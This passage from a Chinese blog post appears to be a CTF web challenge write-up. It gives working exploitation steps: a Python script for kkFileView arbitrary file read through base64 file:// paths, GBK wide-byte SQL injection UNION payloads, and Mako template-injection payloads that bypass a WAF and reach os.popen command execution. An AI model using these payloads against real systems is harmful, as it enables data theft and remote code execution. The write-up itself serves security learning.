class="keyword">for</span> kw <span class="keyword">in</span> keywords:</span><br><span class="line">            <span class="keyword">if</span> kw <span class="keyword">in</span> resp.text.lower():</span><br><span class="line">                found.append(kw)</span><br><span class="line">        <span class="keyword">if</span> found:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[!] Keywords found: <span class="subst">&#123;found&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] Empty or error response.&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Response preview:&quot;</span>, <span class="built_in">repr</span>(resp.text[:<span class="number">200</span>]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[!] Request failed: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>输出</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">PS D:\CODE&gt; python -u &quot;d:\CODE\test\test.py&quot;</span><br><span class="line">[*] Reading: file:///usr/local/bin/docker-entrypoint.sh</span><br><span class="line">[*] Base64 payload: ZmlsZTovLy91c3IvbG9jYWwvYmluL2RvY2tlci1lbnRyeXBvaW50LnNo</span><br><span class="line">[*] Status Code: 200</span><br><span class="line">[*] Script content:</span><br><span class="line">============================================================</span><br><span class="line">#!/bin/sh</span><br><span class="line">set -eu</span><br><span class="line"></span><br><span class="line"># Pick dynamic flag from common CTF platforms.</span><br><span class="line">if [ &quot;$&#123;DASFLAG:-&#125;&quot; ]; then</span><br><span class="line">    INSERT_FLAG=&quot;$DASFLAG&quot;</span><br><span class="line">    export DASFLAG=&quot;no_FLAG&quot;</span><br><span class="line">elif [ &quot;$&#123;FLAG:-&#125;&quot; ]; then</span><br><span class="line">    INSERT_FLAG=&quot;$FLAG&quot;</span><br><span class="line">    export FLAG=&quot;no_FLAG&quot;</span><br><span class="line">elif [ &quot;$&#123;GZCTF_FLAG:-&#125;&quot; ]; then</span><br><span class="line">    INSERT_FLAG=&quot;$GZCTF_FLAG&quot;</span><br><span class="line">    export GZCTF_FLAG=&quot;no_FLAG&quot;</span><br><span class="line">else</span><br><span class="line">    INSERT_FLAG=&quot;flag&#123;TEST_Dynamic_FLAG&#125;&quot;</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">CACHE_DIR=&quot;/opt/kkfileview/cache/parsed&quot;</span><br><span class="line">ZIP_NAME=&quot;q1_finance_report_2026.zip&quot;</span><br><span class="line"></span><br><span class="line">mkdir -p &quot;$CACHE_DIR&quot;</span><br><span class="line"></span><br><span class="line"># Rebuild challenge artifacts on each container start so the flag is dynamic.</span><br><span class="line">printf &#x27;%s\n&#x27; \</span><br><span class="line">  &#x27;cd /opt/kkfileview/bin&#x27; \</span><br><span class="line">  &#x27;./startup.sh --cache.dir=/opt/kkfileview/cache/parsed&#x27; \</span><br><span class="line">  &#x27;java -jar kkFileView.jar --cache.dir=/opt/kkfileview/cache/parsed --forceUpdatedCache=true&#x27; \</span><br><span class="line">  &#x27;cp /opt/kkfileview/cache/parsed/q1_finance_report_2026.zip /tmp/q1_finance_report_2026.zip&#x27; \</span><br><span class="line">  &gt; /root/.bash_history</span><br><span class="line"></span><br><span class="line">echo &quot;$INSERT_FLAG&quot; &gt; /tmp/flag.txt</span><br><span class="line">(</span><br><span class="line">    cd /tmp</span><br><span class="line">    rm -f &quot;$&#123;CACHE_DIR&#125;/$&#123;ZIP_NAME&#125;&quot;</span><br><span class="line">    jar -cf &quot;$&#123;CACHE_DIR&#125;/$&#123;ZIP_NAME&#125;&quot; flag.txt</span><br><span class="line">)</span><br><span class="line">rm -f /tmp/flag.txt</span><br><span class="line"></span><br><span class="line">exec &quot;$@&quot;</span><br><span class="line"></span><br><span class="line">============================================================</span><br><span class="line">[!] Keywords found: [&#x27;flag&#x27;, &#x27;finance&#x27;, &#x27;sh&#x27;]</span><br></pre></td></tr></table></figure>
+<p>从 <code>docker-entrypoint.sh</code> 的内容可以看出，Flag 被动态写入了 <code>/tmp/flag.txt</code>，然后被打包进了 ZIP 文件，最后 <code>/tmp/flag.txt</code> 被删除了。</p>
+<h3 id="关键线索分析"><a class="markdownIt-Anchor" href="#关键线索分析"></a> 关键线索分析</h3>
+<ol>
+<li>Flag 写入：<code>echo &quot;$INSERT_FLAG&quot; &gt; /tmp/flag.txt</code></li>
+<li>打包路径：<code>jar -cf &quot;$&#123;CACHE_DIR&#125;/$&#123;ZIP_NAME&#125;&quot; flag.txt</code>
+<ul>
+<li><code>CACHE_DIR</code> = <code>/opt/kkfileview/cache/parsed</code></li>
+<li><code>ZIP_NAME</code> = <code>q1_finance_report_2026.zip</code></li>
+</ul>
+</li>
+<li>最终文件位置：<code>/opt/kkfileview/cache/parsed/q1_finance_report_2026.zip</code></li>
+<li>清理操作：<code>rm -f /tmp/flag.txt</code> （所以直接读 <code>/tmp/flag.txt</code> 肯定没了）</li>
+</ol>
+<p>继续脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># ========== 配置区 ==========</span></span><br><span class="line">TARGET_URL = <span class="string">&quot;http://challenge.cyclens.tech:30243/kkfileview/getCorsFile&quot;</span></span><br><span class="line">FILE_PATH = <span class="string">&quot;file:///opt/kkfileview/cache/parsed/q1_finance_report_2026.zip&quot;</span>  <span class="comment"># 👈 目标ZIP</span></span><br><span class="line"></span><br><span class="line">COOKIES = &#123;<span class="string">&quot;JSESSIONID&quot;</span>: <span class="string">&quot;&lt;YOUR_SESSION_ID&gt;&quot;</span>&#125;  <span class="comment"># 替换为你自己登录后的Cookie</span></span><br><span class="line">HEADERS = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># ============================</span></span><br><span class="line"></span><br><span class="line">payload = base64.b64encode(FILE_PATH.encode()).decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[*] Downloading: <span class="subst">&#123;FILE_PATH&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">url = <span class="string">f&quot;<span class="subst">&#123;TARGET_URL&#125;</span>?urlPath=<span class="subst">&#123;payload&#125;</span>&quot;</span></span><br><span class="line">resp = requests.get(url, cookies=COOKIES, headers=HEADERS, timeout=<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> resp.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="built_in">len</span>(resp.content) &gt; <span class="number">100</span>:</span><br><span class="line">    zip_path = <span class="string">&quot;q1_finance_report_2026.zip&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(zip_path, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(resp.content)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Saved to <span class="subst">&#123;zip_path&#125;</span> (<span class="subst">&#123;<span class="built_in">len</span>(resp.content)&#125;</span> bytes)&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[!] Now run: python -c \&quot;import zipfile; z=zipfile.ZipFile(&#x27;q1_finance_report_2026.zip&#x27;); print(z.read(&#x27;flag.txt&#x27;).decode())\&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[!] Failed: Status=<span class="subst">&#123;resp.status_code&#125;</span>, Size=<span class="subst">&#123;<span class="built_in">len</span>(resp.content)&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Preview:&quot;</span>, <span class="built_in">repr</span>(resp.text[:<span class="number">300</span>]))</span><br></pre></td></tr></table></figure>
+<p>最后在终端执行以下命令即可提取 Flag：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;import zipfile; z=zipfile.ZipFile(&#x27;q1_finance_report_2026.zip&#x27;); print(z.read(&#x27;flag.txt&#x27;).decode())&quot;</span></span><br></pre></td></tr></table></figure>
+<p><img src="05.png" alt="actuator-env" /></p>
+<h1 id="lit_ezsql"><a class="markdownIt-Anchor" href="#lit_ezsql"></a> lit_ezsql</h1>
+<h2 id="gbk-宽字节绕过单引号"><a class="markdownIt-Anchor" href="#gbk-宽字节绕过单引号"></a> GBK 宽字节绕过单引号</h2>
+<p>正常查询的话，表单会把参数提交到 <code>/query</code></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /query?id=1</span><br></pre></td></tr></table></figure>
+<p><img src="06.png" alt="actuator-env" /></p>
+<p>然后我们可以尝试加上<code>debug=1</code></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /query?debug=1&amp;id=1</span><br></pre></td></tr></table></figure>
+<p>页面会额外回显 SQL：</p>
+<p><img src="07.png" alt="actuator-env" /></p>
+<p>这说明输入点被放进了单引号里。</p>
+<p>直接输入单引号测试：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;</span><br></pre></td></tr></table></figure>
+<p><img src="08.png" alt="actuator-env" /></p>
+<p>说明服务端对单引号做了反斜杠转义，普通注入无法直接闭合。</p>
+<p>利用 <strong>GBK 宽字节</strong>注入绕过</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /query?debug=1&amp;id=-1%BF%27%20UNION%20SELECT%201,2,3,4,5%23</span><br></pre></td></tr></table></figure>
+<p><img src="09.png" alt="actuator-env" /></p>
+<p>回显成功</p>
+<p><strong>原理：</strong></p>
+<ul>
+<li>服务端先把单引号转义成 <code>\</code> + <code>'</code></li>
+<li>发送 <code>%BF%27</code> 后，转义结果会变成 <code>%BF%5C%27</code></li>
+<li>在 GBK 编码下，<code>%BF%5C</code> 会被解释成一个双字节字符</li>
+<li>后面的 <code>%27</code> 就重新变成了有效单引号，从而成功逃逸字符串</li>
+</ul>
+<p>查库名：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /query?id=-1%BF%27%20UNION%20SELECT%201,database(),3,4,5%23</span><br></pre></td></tr></table></figure>
+<p>查到<code>ezsql</code></p>
+<p><img src="10.png" alt="actuator-env" /></p>
+<p>查表名：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /query?id=-1%BF%27%20UNION%20SELECT%201,group_concat(table_name),3,4,5%20FROM%20information_schema.tables%20WHERE%20table_schema=database()%23</span><br></pre></td></tr></table></figure>
+<p>查到<code>flag_store</code></p>
+<p><img src="11.png" alt="actuator-env" /></p>
+<p>查列名：</p>
+<p>因为过滤了<code>flag</code>字符串，所以使用<strong>十六进制绕过</strong></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /query?id=-1%BF%27%20UNION%20SELECT%201,group_concat(column_name),3,4,5%20FROM%20information_schema.columns%20WHERE%20table_name=0x666c61675f73746f7265%23</span><br></pre></td></tr></table></figure>
+<p>查到<code>flag</code></p>
+<p><img src="12.png" alt="actuator-env" /><br />
+查字段：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /query?id=-1%BF%27%20UNION%20SELECT%201,flag,3,4,5%20FROM%20flag_store%23</span><br></pre></td></tr></table></figure>
+<p><img src="13.png" alt="actuator-env" /></p>
+<h1 id="lit_ezssti"><a class="markdownIt-Anchor" href="#lit_ezssti"></a> lit_ezssti</h1>
+<h2 id="mako-模板注入"><a class="markdownIt-Anchor" href="#mako-模板注入"></a> Mako 模板注入</h2>
+<p>首页是一个表单，<code>POST /</code> ，提交参数 <code>tpl</code>，服务端会把渲染结果回显到页面里</p>
+<h3 id="测模板指纹"><a class="markdownIt-Anchor" href="#测模板指纹"></a> 测模板指纹</h3>
+<ul>
+<li><strong>Mako</strong>：使用 <code>&lt;% ... %&gt;</code> 作为脚本块标记（如 <code>&lt;% import os %&gt;</code>）</li>
+<li><strong>Jinja2</strong>：使用 <code>&#123;% ... %&#125;</code> 作为逻辑控制标记（如 <code>&#123;% if x %&#125;</code>）</li>
+<li><strong>Freemarker</strong>：使用 <code>&lt;#...&gt;</code> 作为指令标记或 <code>$&#123;...&#125;</code> 作为插值标记</li>
+<li><strong>Thymeleaf</strong>：使用 <code>th:*</code> 作为属性标记或 <code>[[...]]</code> 作为内联表达式标记</li>
+</ul>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tpl=&#123;&#123;7*7&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>回显原样返回，不执行</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tpl=&#123;% for x in [1] %&#125;OK&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+<p>返回<code>WAF</code></p>
+<p>继续测：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tpl=&lt;%</span><br></pre></td></tr></table></figure>
+<p>返回：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[渲染异常] SyntaxException: Expected: %&gt; at line: 1 char: 1</span><br></pre></td></tr></table></figure>
+<p>这说明模板引擎不是<code> Jinja2</code>，而是<code> Mako</code></p>
+<p>测试 payload：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tpl=&lt;% __M_writer(str(49)) %&gt;</span><br></pre></td></tr></table></figure>
+<p>成功回显：<code>49</code></p>
+<p>说明已经是<strong>Mako 模板</strong>代码执行</p>
+<h3 id="分析-waf"><a class="markdownIt-Anchor" href="#分析-waf"></a> 分析 WAF</h3>
+<p>当时手动测了一会，想想挺傻的，可以用 bp 做模糊测试</p>
+<p>黑名单比较粗暴，实测会拦的内容包括：</p>
+<ul>
+<li><code>=</code></li>
+<li><code>.</code></li>
+<li><code>[</code></li>
+<li><code>]</code></li>
+<li><code>$&#123;</code></li>
+<li>某些关键字直接命中时也会拦，比如 <code>flag</code></li>
+</ul>
+<p>但它只是做<strong>字符串匹配</strong>，所以可以用字符串拼接绕过。</p>
+<p>例如：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tpl=&lt;% __M_writer(&#x27;/fla&#x27;+&#x27;g&#x27;) %&gt;</span><br></pre></td></tr></table></figure>
+<p>不会被拦，且最终运行时仍然得到<code>/flag&lt;/font&gt;</code></p>
+<h3 id="读取-flag"><a class="markdownIt-Anchor" href="#读取-flag"></a> 读取 flag</h3>
+<p>先验证命令执行：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tpl=&lt;% __M_writer(next(iter(getattr(__import__(&#x27;os&#x27;),&#x27;popen&#x27;)(&#x27;id&#x27;)))) %&gt;</span><br></pre></td></tr></table></figure>
+<p>回显：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>
+<p>说明命令执行成功</p>
+<p>那就可以读<code>flag</code>了</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tpl=&lt;% __M_writer(next(getattr(getattr(__import__(&#x27;builtins&#x27;),&#x27;open&#x27;)(&#x27;/fla&#x27;+&#x27;g&#x27;),&#x27;__iter__&#x27;)())) %&gt;</span><br></pre></td></tr></table></figure>
+<p>拿到 flag</p>
+<h1 id="lit_reverse_my_web"><a class="markdownIt-Anchor" href="#lit_reverse_my_web"></a> lit_reverse_my_web</h1>
+<h2 id="jwt"><a class="markdownIt-Anchor" href="#jwt"></a> JWT</h2>
+<p>访问首页后可以看到这是一个登录系统，公开功能主要有：<code>/register</code>和<code>/login</code></p>
+<p>注册普通用户并登录后，首页会出现一个进入归档中心的入口，对应路径为：<code>/flag</code></p>
+<p>但普通用户访问 /flag 会返回：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">403 Forbidden</span><br><span class="line">您暂时无此资源的访问权限</span><br></pre></td></tr></table></figure>
+<p>这说明：</p>
+<ul>
+<li>flag 在服务端。</li>
+<li><code>/flag</code> 需要更高权限。</li>
+</ul>
+<p>平台把赛题关了，以后再来复现一下</p>
+
+    </div>
+    <footer class="article-footer">
+        <a class="article-category-link" href="/categories/%E8%B5%9B%E9%A2%98/" title="赛题" data-aos="zoom-in">赛题</a>
+
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/web/" rel="tag" title="web">web</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E5%A4%8D%E7%8E%B0/" rel="tag" title="复现">复现</a></li></ul>
+
+    </footer>
+  </div>
+    <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
+      <div class="article-nav-link-wrap left">
+          <img data-src="/images/covers/12.jpg" data-sizes="auto" alt="工具使用" class="lazyload">
+        <a href="/2026/05/28/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" aria-label="前一篇: 工具使用" title="前一篇: 工具使用"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+            工具使用
+        </h3>
+      </div>
+    <div class="article-nav-link-wrap right">
+        <img data-src="/images/covers/06.jpg" data-sizes="auto" alt="CTF大语言模型（LLM）提示词注入12种方法" class="lazyload">
+      <a href="/2026/04/23/CTF%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B%EF%BC%88LLM%EF%BC%89%E6%8F%90%E7%A4%BA%E8%AF%8D%E6%B3%A8%E5%85%A512%E7%A7%8D%E6%96%B9%E6%B3%95/" aria-label="后一篇: CTF大语言模型（LLM）提示词注入12种方法"  title="后一篇: CTF大语言模型（LLM）提示词注入12种方法"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+          CTF大语言模型（LLM）提示词注入12种方法
+      </h3>
+    </div>
+  </nav>
+
+</article>
+
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    <div>
+      <span class="icon-copyright"></span>
+        2026
+        <span class="footer-info-sep rotate"></span>
+      Ether
+    </div>
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+      <div>
+        <span class="icon-brush"></span>
+        14.2k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        01:02
+      </div>
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+  </div>
+</footer>
+
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8D%8E%E8%BE%B0%E4%BC%81%E4%B8%9A%E6%9C%8D%E5%8A%A1%E8%BF%90%E8%90%A5%E5%B9%B3%E5%8F%B0"><span class="toc-number">1.</span> <span class="toc-text"> 华辰企业服务运营平台</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#northbridge-document-hub"><span class="toc-number">2.</span> <span class="toc-text"> Northbridge Document Hub</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">2.1.</span> <span class="toc-text"> 任意文件读取</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E7%BA%BF%E7%B4%A2%E5%88%86%E6%9E%90"><span class="toc-number">2.1.1.</span> <span class="toc-text"> 关键线索分析</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#lit_ezsql"><span class="toc-number">3.</span> <span class="toc-text"> lit_ezsql</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#gbk-%E5%AE%BD%E5%AD%97%E8%8A%82%E7%BB%95%E8%BF%87%E5%8D%95%E5%BC%95%E5%8F%B7"><span class="toc-number">3.1.</span> <span class="toc-text"> GBK 宽字节绕过单引号</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#lit_ezssti"><span class="toc-number">4.</span> <span class="toc-text"> lit_ezssti</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#mako-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5"><span class="toc-number">4.1.</span> <span class="toc-text"> Mako 模板注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E6%A8%A1%E6%9D%BF%E6%8C%87%E7%BA%B9"><span class="toc-number">4.1.1.</span> <span class="toc-text"> 测模板指纹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-waf"><span class="toc-number">4.1.2.</span> <span class="toc-text"> 分析 WAF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96-flag"><span class="toc-number">4.1.3.</span> <span class="toc-text"> 读取 flag</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#lit_reverse_my_web"><span class="toc-number">5.</span> <span class="toc-text"> lit_reverse_my_web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#jwt"><span class="toc-number">5.1.</span> <span class="toc-text"> JWT</span></a></li></ol></li></ol>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="Ether" class="lazyload">
+  <div class="sidebar-author-name">Ether</div>
+  <div class="sidebar-description">求索本身即是归路</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">5</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">2</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">4</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-email sidebar-social-icon">
+      <a href=2930289360@qq.com itemprop="url" target="_blank" aria-label="email" rel="noopener nofollow noreferrer"></a>
+    </div>
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/yourname itemprop="url" target="_blank" aria-label="github" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon ">
+                
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/blog/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon ">
+                
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/blog/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon ">
+                
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/blog/friends" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon ">
+                
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+</div>
+</div>
+  </div>
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+</nav>
+
+    </div>
+      <div class="site-search">
+        <div class="reimu-popup popup">
+          <div class="reimu-search">
+            <div class="reimu-search-input-icon"></div>
+            <div id="reimu-search-input"></div>
+            <div class="popup-btn-close"></div>
+          </div>
+          <div class="reimu-results">
+            <div id="reimu-stats"></div>
+            <div id="reimu-hits"></div>
+            <div id="reimu-pagination" class="reimu-pagination"></div>
+          </div>
+          <img class="reimu-bg" src="/images/reimu.png" loading="lazy" decoding="async" fetchpriority="low"/>
+        </div>
+      </div>
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+  <script>
+    var ALGOLIA_CONFIG = {
+      logo: "/images/algolia_logo.svg",
+      algolia: {
+        applicationID: "${ALGOLIA_APP_ID}",
+        apiKey: "${ALGOLIA_SEARCH_KEY}",
+        indexName: "${ALGOLIA_INDEX_NAME}",
+        hits: {
+          "per_page": parseInt("10")
+        },
+        labels: {
+          "input_placeholder": "搜索.....",
+          "hits_empty": "未发现与 「${query}」相关内容",
+          "hits_stats": "找到${hits}条结果（用时 ${time} ms）"
+        }
+      }
+    };
+  </script>
+  
+<script src="https://npm.webcache.cn/algoliasearch@4.17.1/dist/algoliasearch-lite.umd.js" integrity="sha384-xvLS0jfKuoREs7pqkRI&#x2F;OI8GcqohO5S+jQz7ZBtQXnsXmD+9jDOOY4cL6dCPzlrk" crossorigin="anonymous" defer></script>
+
+  
